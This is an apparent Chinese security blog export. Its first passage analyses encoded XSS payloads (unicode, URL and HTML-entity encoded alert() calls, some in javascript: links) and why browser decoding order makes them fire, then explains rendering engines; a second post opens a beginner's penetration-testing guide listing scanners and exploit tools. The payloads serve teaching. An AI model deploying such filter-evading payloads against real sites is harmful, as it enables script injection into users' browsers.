<p>10&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(10);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x76F4;&#x63A5;&#x8FDB;&#x5165; JavaScript &#x89E3;&#x6790;&#x3002;&#x4E14;&#x53D1;&#x73B0;unicode&#x7F16;&#x7801;&#xFF0C;&#x5176;&#x4E3A; alert &#x6807;&#x8BC6;&#x7B26;&#x8FDB;&#x884C;&#x7F16;&#x7801;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x6240;&#x4EE5;&#x80FD;&#x5148;&#x89E3;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;<p></p>
<p>11&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;&#x540C;8: &#x51FA;&#x73B0;&#x62EC;&#x53F7;&#x8FDB;&#x884C;&#x4E86;unicode&#x7F16;&#x7801;&#xFF0C;JS&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x7F16;&#x7801;&#x540E;&#x7684;&#x63A7;&#x5236;&#x5B57;&#x7B26;<p></p>
<p>12&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x5176;&#x5B9E;&#x4E2A;&#x4EBA;&#x6700;&#x5F00;&#x59CB;&#x770B;&#x5230;payload&#x662F;&#x611F;&#x89C9;&#x80FD;&#x5F39;&#x7A97;&#x7684;&#xFF0C;&#x540E;&#x6765;&#x53C2;&#x8003;&#x4E86;&#x522B;&#x4EBA;&#x7684;&#x601D;&#x8DEF;&#x3002;&#x53D1;&#x73B0;<code>\u0031\u0032</code>&#x5728;&#x89E3;&#x7801;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x88AB;&#x89E3;&#x7801;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;12&#x3002;&#x9700;&#x8981;&#x5F15;&#x53F7;&#x5305;&#x88F9;&#x3002;&#x56E0;&#x6B64;&#x4E0D;&#x6267;&#x884C;JS<p></p>
<p>13&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(&apos;13\u0027)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C;&#x539F;&#x56E0;&#x540C;8: &#x51FA;&#x73B0;&#x5355;&#x5F15;&#x53F7;&#x8FDB;&#x884C;&#x4E86;unicode&#x7F16;&#x7801;&#xFF0C;JS&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x7F16;&#x7801;&#x540E;&#x7684;&#x63A7;&#x5236;&#x5B57;&#x7B26;<p></p>
<p>14&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert(<span class="hljs-string">&apos;14\u000a&apos;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x5F39;&#x7A97;&#x3002;&#x539F;&#x56E0;: <code>\u000a</code>&#x5728;JavaScript&#x91CC;&#x662F;&#x6362;&#x884C;&#xFF0C;&#x5C31;&#x662F;<code>\n</code>&#xFF0C;&#x76F4;&#x63A5;&#x6267;&#x884C;<p></p>
<p>&#x7EC4;&#x5408;&#x62F3;:<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5148;&#x8FDB;&#x884C;HTML&#x89E3;&#x7801;&#x5F97;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x7136;&#x540E;&#x8FDB;&#x5165; URL &#x6A21;&#x5757;&#x5904;&#x7406;&#xFF0C;&#x53D1;&#x73B0;&#x5B8C;&#x6574; <code>javascript:</code> &#x534F;&#x8BAE;&#xFF0C;&#x8FDB;&#x884C;URL&#x89E3;&#x7801;&#x3002;&#x5F97;<code>javascript:\u0061\u006c\u0065\u0072\u0074(15)</code><br>&#x63A7;&#x5236;&#x5B57;&#x7B26; <code>()</code>&#x672A;&#x88AB;unicode&#x7F16;&#x7801;&#xFF0C;&#x56E0;&#x6B64;&#x8FDB;&#x884C; JavaScript &#x89E3;&#x7801;&#xFF0C;&#x6210;&#x529F;&#x5F39;&#x7A97;<p></p>
<h2 id="&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;"></a>&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;</h2><h3 id="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;"></a>&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;</h3><p>&#x5448;&#x73B0;&#x5F15;&#x64CE;&#x9ED8;&#x8BA4;&#x53EF;&#x4EE5;&#x89E3;&#x6790;html&#x6587;&#x6863;&#x3001;xml&#x6587;&#x6863;&#x4EE5;&#x53CA;&#x56FE;&#x7247;&#x7B49;&#x8D44;&#x6E90;&#x5E76;&#x5C06;&#x89E3;&#x6790;&#x540E;&#x7684;&#x5185;&#x5BB9;&#x5C55;&#x793A;&#x7ED9;&#x7528;&#x6237;&#x3002;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x63D2;&#x4EF6;&#xFF08;&#x6D4F;&#x89C8;&#x5668;&#x6269;&#x5C55;&#x7A0B;&#x5E8F;&#xFF09;&#x6D4F;&#x89C8;&#x5668;&#x8FD8;&#x53EF;&#x4EE5;&#x5C55;&#x793A;&#x5176;&#x4ED6;&#x5404;&#x7C7B;&#x578B;&#x7684;web&#x8D44;&#x6E90;&#xFF0C;&#x5982;pdf&#x63D2;&#x4EF6;&#x53EF;&#x4EE5;&#x8BA9;&#x6D4F;&#x89C8;&#x5668;&#x5C55;&#x793A;pdf&#x6587;&#x6863;&#x3002;&#x4E0D;&#x540C;&#x6D4F;&#x89C8;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;&#x4E5F;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x76EE;&#x524D;&#x4E3B;&#x6D41;&#x7684;&#x5448;&#x73B0;&#x5F15;&#x64CE;&#x6709;Webkit&#x3001;Blink(Webkit&#x7684;&#x4E00;&#x4E2A;&#x5206;&#x652F;)&#x3001;Gecko&#x3001;Trident&#x3001;EdgeHTML(Trident&#x7684;&#x4E00;&#x4E2A;&#x5206;&#x652F;)&#x3002;</p>
<table>
<thead>
<tr>
<th align="center">&#x6D4F;&#x89C8;&#x5668;</th>
<th align="center">&#x5448;&#x73B0;&#x5F15;&#x64CE;</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Chrome</td>
<td align="center">Blink&#xFF08;Chrome 28+&#xFF09;<br> Webkit&#xFF08;Chrome 27-&#xFF09;</td>
</tr>
<tr>
<td align="center">Safari</td>
<td align="center">Webkit</td>
</tr>
<tr>
<td align="center">Firefox</td>
<td align="center">Gecko</td>
</tr>
<tr>
<td align="center">Edge</td>
<td align="center">EdgeHTML</td>
</tr>
<tr>
<td align="center">IE</td>
<td align="center">Trident</td>
</tr>
</tbody></table>
<h3 id="&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;"><a href="#&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;" class="headerlink" title="&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;"></a>&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;</h3><p>&#x5F53;&#x6211;&#x4EEC;&#x70B9;&#x51FB;&#x4E00;&#x4E2A;&#x94FE;&#x63A5;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5C06; HTML &#x4EE3;&#x7801;&#x4F20;&#x8F93;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x63A5;&#x6536;&#x5230;&#x8FD9;&#x4EFD; HTML &#x4EE3;&#x7801;&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x7684;&#x9875;&#x9762;&#x7684;&#x5448;&#x73B0;&#xFF0C;&#x7C97;&#x7565;&#x7684;&#x8BF4;&#x4F1A;&#x7ECF;&#x8FC7;&#x4EE5;&#x4E0B;&#x8FD9;&#x4E9B;&#x6B65;&#x9AA4;&#xFF1A;</p>
<ol>
<li>DOM &#x6811;&#x7684;&#x6784;&#x5EFA;&#xFF08;Parse HTML&#xFF09;</li>
<li>&#x6784;&#x5EFA; CSSOM &#x6811;&#xFF08;Recaculate Style&#xFF09;</li>
<li>&#x5408;&#x5E76; DOM &#x6811;&#x4E0E; CSSOM &#x6811;&#x4E3A; Render &#x6811;</li>
<li>&#x5E03;&#x5C40;&#xFF08;Layout&#xFF09;</li>
<li>&#x7ED8;&#x5236;&#xFF08;Paint&#xFF09;</li>
<li>&#x590D;&#x5408;&#x56FE;&#x5C42;&#x5316;&#xFF08;Composite&#xFF09;</li>
</ol>
<p>&#x9875;&#x9762;&#x5448;&#x73B0;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x963B;&#x585E;</p>
<ol>
<li>&#x5F53;&#x9047;&#x5230; JavaScript &#x811A;&#x672C;&#x6216;&#x8005;&#x5916;&#x90E8; JavaScript &#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4FBF;&#x505C;&#x6B62; DOM &#x7684;&#x6784;&#x5EFA;&#xFF08;&#x963B;&#x585E; 1&#xFF09;</li>
<li>&#x5F53;&#x9047;&#x5230; <code>&lt;script&gt;</code> &#x6807;&#x7B7E;&#x9700;&#x8981;&#x6267;&#x884C;&#x811A;&#x672C;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x68C0;&#x67E5;&#x662F;&#x5426;&#x8FD9;&#x4E2A; <code>&lt;script&gt;</code> &#x6807;&#x7B7E;&#x4EE5;&#x4E0A;&#x7684; CSS &#x6587;&#x4EF6;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x5E76;&#x7528;&#x4E8E;&#x6784;&#x5EFA;&#x4E86; CSSOM&#xFF0C;&#x5982;&#x679C; <code>&lt;script&gt;</code> &#x4E0A;&#x90E8;&#x8FD8;&#x6709; CSS &#x6837;&#x5F0F;&#x6CA1;&#x52A0;&#x8F7D;&#xFF0C;&#x5219;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x7B49;&#x5F85; <code>&lt;script&gt;</code> &#x4E0A;&#x65B9;&#x6837;&#x5F0F;&#x7684;&#x52A0;&#x8F7D;&#x5B8C;&#x6210;&#x624D;&#x4F1A;&#x6267;&#x884C;&#x8BE5; <code>&lt;script&gt;</code> &#x5185;&#x7684;&#x811A;&#x672C;&#xFF08;&#x963B;&#x585E; 2&#xFF09;</li>
<li>DOM &#x6811;&#x4E0E; CSSOM &#x6811;&#x7684;&#x6210;&#x529F;&#x6784;&#x5EFA;&#x662F;&#x540E;&#x9762;&#x6B65;&#x9AA4;&#x7684;&#x6839;&#x57FA;&#xFF08;&#x540C;&#x6B65;&#x963B;&#x585E;&#xFF09;</li>
<li>&#x540C;&#x65F6;&#x5916;&#x90E8;&#x811A;&#x672C;&#x3001;&#x5916;&#x90E8;&#x6837;&#x5F0F;&#x8868;&#x7684;&#x4E0B;&#x8F7D;&#x4E5F;&#x662F;&#x8017;&#x8D39;&#x65F6;&#x95F4;&#x8F83;&#x591A;&#x7684;&#x70B9;</li>
</ol>
<h3 id="Webkit&#x548C;Gecko&#x7684;&#x6D41;&#x7A0B;&#x5BF9;&#x6BD4;"><a href="#Webkit&#x548C;Gecko&#x7684;&#x6D41;&#x7A0B;&#x5BF9;&#x6BD4;" class="headerlink" title="Webkit&#x548C;Gecko&#x7684;&#x6D41;&#x7A0B;&#x5BF9;&#x6BD4;"></a>Webkit&#x548C;Gecko&#x7684;&#x6D41;&#x7A0B;&#x5BF9;&#x6BD4;</h3><p>Webkit&#x7684;&#x4E3B;&#x8981;&#x6D41;&#x7A0B;&#xFF08;&#x56FE;&#x7247;&#x6458;&#x81EA;Tali Garsiel&#x7684;&#x7814;&#x7A76;&#x6210;&#x679C;)<br><img src="/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/image-20201113201822991.png" alt="image-20201113201822991"></p>
<p>Gecko&#x7684;&#x4E3B;&#x8981;&#x6D41;&#x7A0B;&#xFF08;&#x56FE;&#x7247;&#x6458;&#x81EA;Tali Garsiel&#x7684;&#x7814;&#x7A76;&#x6210;&#x679C;&#xFF09;<br><img src="/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/image-20201113201829531.png" alt="image-20201113201829531"></p>
<h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="headerlink" title="&#x53C2;&#x8003;&#x94FE;&#x63A5;"></a>&#x53C2;&#x8003;&#x94FE;&#x63A5;</h2><p><a href="https://lihuaiqiu.github.io/2020/02/14/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E4%B8%8E%E8%A7%A3%E7%A0%81%E5%8E%9F%E7%90%86%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86xss/#more" target="_blank" rel="noopener">&#x4ECE;&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;&#x4E0E;&#x89E3;&#x7801;&#x539F;&#x7406;&#x91CD;&#x65B0;&#x8BA4;&#x8BC6;xss</a><br><a href="https://xz.aliyun.com/t/5863#toc-4" target="_blank" rel="noopener">&#x6D4F;&#x89C8;&#x5668;&#x89E3;&#x7801;&#x770B;XSS</a><br><a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">&#x6DF1;&#x5165;&#x7406;&#x89E3;&#x6D4F;&#x89C8;&#x5668;&#x89E3;&#x6790;&#x673A;&#x5236;&#x548C;XSS&#x5411;&#x91CF;&#x7F16;&#x7801;</a><br><a href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#The_browsers_we_will_talk_about" target="_blank" rel="noopener">&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF1A;&#x65B0;&#x5F0F;&#x7F51;&#x7EDC;&#x6D4F;&#x89C8;&#x5668;&#x5E55;&#x540E;&#x63ED;&#x79D8;</a><br><a href="https://www.zybuluo.com/yangfch3/note/671516" target="_blank" rel="noopener">&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x3001;JS &#x5F15;&#x64CE;&#x3001;&#x9875;&#x9762;&#x5448;&#x73B0;&#x539F;&#x7406;&#x53CA;&#x5176;&#x4F18;&#x5316;</a><br><a href="https://zhuanlan.zhihu.com/p/24911872?refer=dreawer" target="_blank" rel="noopener">&#x4ECE;Chrome&#x6E90;&#x7801;&#x770B;&#x6D4F;&#x89C8;&#x5668;&#x5982;&#x4F55;&#x6784;&#x5EFA;DOM&#x6811;</a><br><a href="https://www.cnblogs.com/imwtr/p/4481092.html" target="_blank" rel="noopener">&#x4E0D;&#x540C;&#x5185;&#x6838;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5DEE;&#x5F02;&#x4EE5;&#x53CA;&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;&#x7B80;&#x4ECB;</a></p>
</body></html>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>第一次渗透测试的分享和小结</title>
    <url>/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<html><head></head><body><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/6078" target="_blank" rel="noopener">https://xz.aliyun.com/t/6078</a></p>
<a id="more"></a>

<h1 id="&#x8BF4;&#x5728;&#x524D;&#x9762;"><a href="#&#x8BF4;&#x5728;&#x524D;&#x9762;" class="headerlink" title="&#x8BF4;&#x5728;&#x524D;&#x9762;"></a>&#x8BF4;&#x5728;&#x524D;&#x9762;</h1><p><strong>&#x9996;&#x5148;&#x5F88;&#x91CD;&#x8981;&#x7684;&#x662F;&#x6388;&#x6743; ~ &#x9996;&#x5148;&#x5F88;&#x91CD;&#x8981;&#x7684;&#x662F;&#x6388;&#x6743; ~ &#x9996;&#x5148;&#x5F88;&#x91CD;&#x8981;&#x7684;&#x662F;&#x6388;&#x6743; ~</strong></p>
<p><a href="http://www.chinapeace.gov.cn/chinapeace/c53715/2019-08/20/content_12281927.shtml" target="_blank" rel="noopener">&#x201C;&#x4E3A;&#x4E86;&#x7ED9;&#x5BB6;&#x4E61;&#x505A;&#x70B9;&#x8D21;&#x732E;&#x201D; &#x7537;&#x5B50;&#x5165;&#x4FB5;&#x653F;&#x5E9C;&#x7F51;&#x7AD9;&#x2026;</a></p>
<p>&#x4E4B;&#x524D;&#x4E5F;&#x770B;&#x8FC7;&#x5F88;&#x591A;&#x5173;&#x4E8E;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x4E00;&#x4E9B;&#x73B0;&#x5B9E;&#x56E0;&#x7D20;&#x7B49;&#x7B49;&#x95EE;&#x9898;&#xFF0C;&#x6CA1;&#xFF08;bu&#xFF09;&#x6709;(gan)&#x771F;&#x6B63;&#x5B9E;&#x64CD;&#xFF0C;&#x6700;&#x8FD1;&#x7531;&#x4E8E;&#x4E00;&#x6B21;&#x5076;&#x7136;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x4EC0;&#x4E48;&#x90FD;&#x4E0D;&#x4F1A;&#x7684;&#x6211;&#x63A5;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x9879;&#x76EE;</p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190903174126-ffbdaa8c-ce2e-1.jpg" alt></p>
<p>&#x7136;&#x540E;&#x5C31;&#x628A;&#x6700;&#x8FD1;&#x5B66;&#x5230;&#x7684;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#xFF0C;&#x548C;&#x4E00;&#x4E9B;&#x5C0F;&#x611F;&#x609F;&#xFF0C;&#x5C0F;&#x6280;&#x5DE7;&#x8BB0;&#x5F55;&#x4E0B;&#x6765;&#xFF0C;&#x7531;&#x4E8E;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x539F;&#x56E0;&#xFF0C;&#x672C;&#x6587;&#x4E2D;&#x4E0D;&#x6D89;&#x53CA;&#x5230;&#x6E17;&#x900F;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x654F;&#x611F;&#x4FE1;&#x606F;</p>
<h1 id="&#x7B2C;&#x4E00;&#x6B21;&#x8FDB;&#x884C;&#x6E17;&#x900F;&#x5982;&#x4F55;&#x4F18;&#x96C5;&#x7684;&#x201D;&#x88C5;&#x201D;&#x6210;&#x662F;&#x4E2A;&#x201D;&#x8001;&#x624B;&#x201D;"><a href="#&#x7B2C;&#x4E00;&#x6B21;&#x8FDB;&#x884C;&#x6E17;&#x900F;&#x5982;&#x4F55;&#x4F18;&#x96C5;&#x7684;&#x201D;&#x88C5;&#x201D;&#x6210;&#x662F;&#x4E2A;&#x201D;&#x8001;&#x624B;&#x201D;" class="headerlink" title="&#x7B2C;&#x4E00;&#x6B21;&#x8FDB;&#x884C;&#x6E17;&#x900F;&#x5982;&#x4F55;&#x4F18;&#x96C5;&#x7684;&#x201D;&#x88C5;&#x201D;&#x6210;&#x662F;&#x4E2A;&#x201D;&#x8001;&#x624B;&#x201D;"></a>&#x7B2C;&#x4E00;&#x6B21;&#x8FDB;&#x884C;&#x6E17;&#x900F;&#x5982;&#x4F55;&#x4F18;&#x96C5;&#x7684;&#x201D;&#x88C5;&#x201D;&#x6210;&#x662F;&#x4E2A;&#x201D;&#x8001;&#x624B;&#x201D;</h1><p>&#x9996;&#x5148;&#x8DDF;&#x6211;&#x4E00;&#x6837;&#x83DC;&#x5F53;&#x7136;&#x662F;&#x88C5;&#x4E0D;&#x51FA;&#x5927;&#x795E;&#x7684;&#xFF0C;&#x5F53;&#x7136;&#x8FD8;&#x662F;<strong>&#x591A;&#x5B66;&#xFF0C;&#x591A;&#x79EF;&#x7D2F;</strong>&#x6700;&#x91CD;&#x8981;&#xFF0C;&#x4F46;&#x662F;&#x65E2;&#x7136;&#x90FD;&#x5F00;&#x59CB;&#x4E86;&#xFF0C;&#x5C31;&#x4E0D;&#x80FD;&#x663E;&#x5F97;&#x592A;&#x5212;&#x6C34;&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x64CD;&#x4F5C;&#x4E0D;&#x80FD;&#x8BA9;&#x4F60;&#x6210;&#x4E3A;&#x5927;&#x795E;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x8BA9;&#x4F60;&#x5728;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#x201D;&#x5FD9;&#x201D;&#x8D77;&#x6765;</p>
<p>&#x76F8;&#x6BD4;&#x4E8E;&#x7F51;&#x4E0A;&#x90A3;&#x4E9B;&#x5F88;&#x8BE6;&#x7EC6;&#x7684;&#x624B;&#x628A;&#x624B;&#x6E17;&#x900F;&#x6559;&#x5B66;&#xFF0C;&#x672C;&#x6587;&#x4E3B;&#x8981;&#x5199;&#x4E00;&#x4E9B;&#x5230; xx&#x516C;&#x53F8; &#x76F4;&#x63A5;&#x5185;&#x7F51;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x90A3;&#x79CD;&#x7B80;&#x8981;&#x6B65;&#x9AA4;</p>
<p>&#x6240;&#x4EE5;<strong>&#x8FD9;&#x4E00;&#x5C0F;&#x8282;&#x4E3B;&#x8981;&#x5199;&#x7ED9;&#x90A3;&#x4E9B;&#x624D;&#x63A5;&#x89E6;&#x5B89;&#x5168;&#xFF0C;&#x6216;&#x8005;&#x6CA1;&#x6709;&#x771F;&#x6B63;&#x505A;&#x8FC7;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x4EBA;</strong>&#x5427;</p>
<p>&#x5927;&#x4F6C;&#x8F7B;&#x55B7;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x9519;&#x8BEF;&#x7684;&#x5730;&#x65B9;&#x4E5F;&#x6B22;&#x8FCE;&#x6279;&#x8BC4;&#x6307;&#x6B63;&#x2026;</p>
<h2 id="&#x9700;&#x8981;&#x51C6;&#x5907;&#x4EC0;&#x4E48;&#xFF1F;"><a href="#&#x9700;&#x8981;&#x51C6;&#x5907;&#x4EC0;&#x4E48;&#xFF1F;" class="headerlink" title="&#x9700;&#x8981;&#x51C6;&#x5907;&#x4EC0;&#x4E48;&#xFF1F;"></a>&#x9700;&#x8981;&#x51C6;&#x5907;&#x4EC0;&#x4E48;&#xFF1F;</h2><h3 id="&#x80FD;&#x591F;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x5DE5;&#x5177;"><a href="#&#x80FD;&#x591F;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x5DE5;&#x5177;" class="headerlink" title="&#x80FD;&#x591F;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x5DE5;&#x5177;"></a>&#x80FD;&#x591F;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x5DE5;&#x5177;</h3><p><strong>Nessus</strong></p>
<p><strong>AWVS</strong></p>
<p><strong>Appscan</strong></p>
<p>burpsuite</p>
<p>sqlmap</p>
<p>Github &amp; Google &#x641C;&#x7D22;&#x6846;</p>
<p>Hydra</p>
<p>&#x81EA;&#x5DF1;&#x6536;&#x96C6;&#x7684;&#x4E00;&#x5927;&#x5806; CVE &#x7684; exp</p>
<p>&#x5404;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#x5DE5;&#x5177;</p>
<p>&#x5DE5;&#x5177;&#x5F53;&#x7136;&#x662F;&#x8D8A;&#x591A;&#x8D8A;&#x597D;</p>
